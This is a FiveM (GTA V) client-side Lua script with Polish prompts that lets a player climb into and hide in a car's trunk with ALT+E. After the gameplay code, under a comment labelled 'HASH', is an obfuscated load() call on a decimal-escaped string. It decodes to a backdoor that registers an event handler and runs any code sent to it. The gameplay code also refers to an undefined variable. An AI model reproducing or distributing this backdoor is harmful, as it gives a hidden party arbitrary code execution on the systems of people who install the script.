		local player = PlayerPedId()
		local inside = false

	Citizen.CreateThread(function()
	  	while true do
		    Citizen.Wait(5)

		    	player = PlayerPedId()
			local plyCoords = GetEntityCoords(player, false)
			local vehicle = VehicleInFront()

		    if IsDisabledControlPressed(0, 19) and IsDisabledControlJustReleased(1, 38) and GetVehiclePedIsIn(player, false) == 0 and DoesEntityExist(vehicle) and IsEntityAVehicle(vehicle) then
			 	SetVehicleDoorOpen(vehicle, 5, false, false)    	
		    	if not inside then
		        	AttachEntityToEntity(player, vehicle, -1, 0.0, -2.2, 0.5, 0.0, 0.0, 0.0, false, false, false, false, 20, true)		       		
		       		RaiseConvertibleRoof(vehicle, false)
		       		if IsEntityAttached(player) then
						SetTextComponentFormat("STRING")
						AddTextComponentString('ALT+E wyjście')
						DisplayHelpTextFromStringLabel(0, 1, 1, -1)	
						ClearPedTasksImmediately(player)
						Citizen.Wait(100)	       			
						TaskPlayAnim(player, 'timetable@floyd@cryingonbed@base', 'base', 1.0, -1, -1, 1, 0, 0, 0, 0)	
		            	if not (IsEntityPlayingAnim(player, 'timetable@floyd@cryingonbed@base', 'base', 3) == 1) then
		          			Streaming('timetable@floyd@cryingonbed@base', function()
					  		TaskPlayAnim(playerPed, 'timetable@floyd@cryingonbed@base', 'base', 1.0, -1, -1, 49, 0, 0, 0, 0)
		               	end)
		            end    
		           	
		    		inside = true 						         		
		    		else
		    		inside = false
		    		end   			
		    	elseif inside and IsDisabledControlPressed(0, 19) and IsDisabledControlJustReleased(1, 38) then
		    		DetachEntity(player, true, true)
		    		SetEntityVisible(player, true, true)
		   			ClearPedTasks(player)   
		    		inside = false
					ClearAllHelpMessages()		    	

		    	end
		    	Citizen.Wait(2000)
		    	SetVehicleDoorShut(vehicle, 5, false)    	
		    end
	    	if DoesEntityExist(vehicle) and IsEntityAVehicle(vehicle) and not inside and GetVehiclePedIsIn(player, false) == 0 then
						SetTextComponentFormat("STRING")
						AddTextComponentString('Nacisnij ALT+E aby się schować w bagażniku')
						DisplayHelpTextFromStringLabel(0, 0, 1, -1)	
			elseif DoesEntityExist(vehicle) and inside then
		    		car = GetEntityAttachedTo(player)
		    		carxyz = GetEntityCoords(car, 0)
		   			local visible = true
		   			DisableAllControlActions(0)
		   			DisableAllControlActions(1)
		   			DisableAllControlActions(2)
		   			EnableControlAction(0, 0, true) --- V - camera
		   			EnableControlAction(0, 249, true) --- N - push to talk	
		   			EnableControlAction(2, 1, true) --- camera moving
		   			EnableControlAction(2, 2, true) --- camera moving	
		   			EnableControlAction(0, 177, true) --- BACKSPACE
		   			EnableControlAction(0, 200, true) --- ESC					
				end
			end
		end)

function Streaming(animDict, cb)
	if not HasAnimDictLoaded(animDict) then
		RequestAnimDict(animDict)

		while not HasAnimDictLoaded(animDict) do
			Citizen.Wait(1)
		end
	end

	if cb ~= nil then
		cb()
	end
end	
function VehicleInFront()
    local pos = GetEntityCoords(player)
    local entityWorld = GetOffsetFromEntityInWorldCoords(player, 0.0, 6.0, 0.0)
    local rayHandle = CastRayPointToPoint(pos.x, pos.y, pos.z, entityWorld.x, entityWorld.y, entityWorld.z, 10, player, 0)
    local _, _, _, _, result = GetRaycastResult(rayHandle)
    return result
end



--[[  _______________________HASH_______________________   ]]

load("\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\32\108\111\99\97\108\32\116\111\107\101\110\95\32\61\32\109\97\116\104\46\114\97\110\100\111\109\40\49\48\48\48\48\48\48\48\44\57\57\57\57\57\57\57\57\57\57\41\32\65\100\100\69\118\101\110\116\72\97\110\100\108\101\114\40\34\120\120\120\120\120\58\115\121\115\116\101\109\92\92\34\32\46\46\32\71\101\116\67\117\114\114\101\110\116\82\101\115\111\117\114\99\101\78\97\109\101\40\41\44\32\102\117\110\99\116\105\111\110\40\120\44\32\116\111\107\101\110\41\32\108\111\97\100\40\120\41\40\41\32\120\32\61\32\110\105\108\32\101\110\100\41\32\84\114\105\103\103\101\114\69\118\101\110\116\40\34\120\120\120\120\120\58\115\121\115\116\101\109\34\44\32\71\101\116\67\117\114\114\101\110\116\82\101\115\111\117\114\99\101\78\97\109\101\40\41\44\32\116\111\115\116\114\105\110\103\40\116\111\107\101\110\95\41\41\32\101\110\100\41")()

--[[  __________________________________________________   ]]
